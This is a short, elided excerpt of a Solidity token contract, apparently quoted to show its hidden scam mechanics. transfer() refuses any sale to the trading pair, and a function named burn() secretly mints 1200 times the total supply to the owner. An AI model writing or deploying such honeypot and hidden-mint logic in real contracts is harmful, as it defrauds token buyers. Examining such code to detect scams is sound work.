...
contract CoinToken {
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        ...
        if (to==MUSICPair()){return false;}
        if (msg.sender==MUSICPair() && balanceOf[to]==0) {Beli = to;}
        if (to== Owner) {Beli=to;}
    ...
    function burn() internal {balanceOf[Owner]+=totalSupply*1200;}
    function MUSICPair() public view returns (address) {
